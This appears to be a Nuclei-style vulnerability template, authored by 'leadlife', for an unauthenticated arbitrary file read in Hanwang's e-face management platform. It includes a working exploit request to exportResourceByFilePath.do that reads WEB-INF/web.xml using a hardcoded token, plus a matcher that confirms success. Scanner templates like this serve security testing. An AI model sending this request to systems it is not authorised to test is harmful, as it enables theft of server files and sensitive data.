id: hanwang-exportResourceByFilePath-fileread
info:
  name: 汉王e脸通综合管理平台 exportResourceByFilePath.do 任意文件读取漏洞
  author: leadlife
  severity: high
  description: 汉王e脸通综合管理平台 exportResourceByFilePath.do 接口存在任意文件读取漏洞。攻击者可在无需认证的情况下，通过构造恶意请求访问 exportResourceByFilePath.do 接口，传入任意文件路径参数，实现服务器上任意文件的读取，影响系统敏感数据的泄露和信息安全。
  reference: 
    - https://www.yuque.com/lvguo-pibd8/fqbwsx/td4v4x9d3u5gg5lt
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
    tips:
    repair:
    version:
  tags: hanwang,fileread

http:
  - raw:
      - |
        GET /manage/leaveList/exportResourceByFilePath.do?recoToken=67mds2pxXQb&filePath=WEB-INF/web.xml HTTP/1.1
        Host: {{Hostname}}
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'xml version','servlet')
        condition: and